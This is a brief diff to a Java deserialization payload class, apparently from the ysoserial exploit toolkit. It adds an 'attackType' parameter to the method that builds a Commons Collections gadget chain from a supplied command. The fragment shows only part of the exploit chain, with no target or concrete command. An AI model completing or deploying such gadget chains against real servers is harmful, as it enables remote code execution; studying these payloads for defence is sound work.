@@ -28,7 +28,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @Authors({ Authors.FROHOFF })
 public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
 
-	public Queue<Object> getObject(final String command) throws Exception {
+	public Queue<Object> getObject(final String command, String attackType) throws Exception {
 		Object templates = Gadgets.createTemplatesImpl(command);
 
 		ConstantTransformer constant = new ConstantTransformer(String.class);
